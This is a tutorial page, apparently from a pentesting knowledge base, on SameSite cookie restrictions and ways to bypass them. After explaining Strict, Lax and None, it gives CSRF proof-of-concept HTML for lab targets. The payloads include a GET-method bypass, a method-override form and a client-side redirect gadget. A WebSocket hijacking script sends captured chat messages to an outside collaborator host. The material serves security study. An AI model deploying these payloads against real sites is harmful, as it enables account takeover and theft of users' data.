# Same-Site

## <mark style="color:$primary;">ABOUT</mark>

<mark style="color:red;">**SameSite**</mark> is a <mark style="color:purple;">**browser security mechanism**</mark> that determines when a website's cookies are included in requests originating from other websites. SameSite cookie restrictions provide partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.

Since 2021, Chrome applies Lax SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. This is a proposed standard, and we expect other major browsers to adopt this behavior in the future. As a result, it's essential to have solid grasp of how these restrictions work, as well as how they can potentially be bypassed, in order to thoroughly test for cross-site attack vectors.

### <mark style="color:blue;">Difference between site and origin</mark>

In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1.

When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from `http://app.example.com/` to `https://app.example.com/` is treated as cross-site by most browsers.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">How does SameSite work?</mark>

Before the SameSite mechanism was introduced, browsers sent cookies in every request to the domain that issued them, even if the request was triggered by an unrelated third-party website. SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies.

All major browsers currently support the following SameSite restriction levels:

* <mark style="color:yellow;">**Strict**</mark>
* <mark style="color:yellow;">**Lax**</mark>
* <mark style="color:yellow;">**None**</mark>

Developers can manually configure a restriction level for each cookie they set, giving them more control over when these cookies are used. To do this, they just have to include the SameSite attribute in the `Set-Cookie` response header, along with their preferred value:

```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

{% hint style="info" %}
If the website issuing the cookie doesn't explicitly set a SameSite attribute, Chrome automatically applies Lax restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.
{% endhint %}

#### <mark style="color:yellow;">Strict</mark>

If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.

This is recommended when setting cookies that enable the bearer to modify data or perform other sensitive actions, such as accessing specific pages that are only available to authenticated users.

Although this is the most secure option, it can negatively impact the user experience in cases where cross-site functionality is desirable.

#### <mark style="color:yellow;">Lax</mark>

Lax SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:

* The request uses the GET method.
* The request resulted from a top-level navigation by the user, such as clicking on a link.

This means that the cookie is not included in cross-site POST requests, for example. As POST requests are generally used to perform actions that modify data or state (at least according to best practice), they are much more likely to be the target of CSRF attacks.

Likewise, the cookie is not included in background requests, such as those initiated by scripts, iframes, or references to images and other resources.

#### <mark style="color:yellow;">None</mark>

If a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.

With the exception of Chrome, this is the default behavior used by major browsers if no SameSite attribute is provided when setting the cookie.

{% hint style="success" %}
If you encounter a cookie set with `SameSite=None` or with no explicit restrictions, it's worth investigating whether it's of any use.
{% endhint %}

## <mark style="color:$primary;">BYPASS RESTRICTIONS</mark>

### <mark style="color:red;">Bypass using GET requests</mark>

In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint, even those that are expecting a form submission. If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a GET request from the victim's browser.

As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Other frameworks support a variety of similar parameters.

**Exploit PoC:**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a94001e038f85ad8653179400fd004a.web-security-academy.net/my-account/change-email" method="GEt">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="aboba&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### <mark style="color:red;">Bypass using on-site gadgets</mark>

If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.&#x20;

As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

**Exploit PoC:**

```html
<script>
    document.location = "https://0a0b006204372d218075038c00320054.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=aboba%40gmail.com%26submit=1";
</script>
```

### <mark style="color:red;">Bypass via vulnerable sibling domains</mark>

#### **WebSocket exfiltration payload:**

```javascript
<script>
var ws = new WebSocket('wss://0aa0003304a9bf0281d830b0006a00b4.web-security-academy.net/chat');

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch('https://7cka2c5mfyng2ass0wvfob3iy940sqgf.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
</script>
```

#### **Delivery via sibling domain login:**

```html
<script>
document.location = "https://cms-0aa0003304a9bf0281d830b0006a00b4.web-security-academy.net/login?username=URL_ENCODED_PAYLOAD_HERE&password=anything";
</script>
```

### <mark style="color:red;">Bypass with newly issued cookies</mark>

Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions.

As mentioned earlier, if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

{% hint style="info" %}
This two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.
{% endhint %}
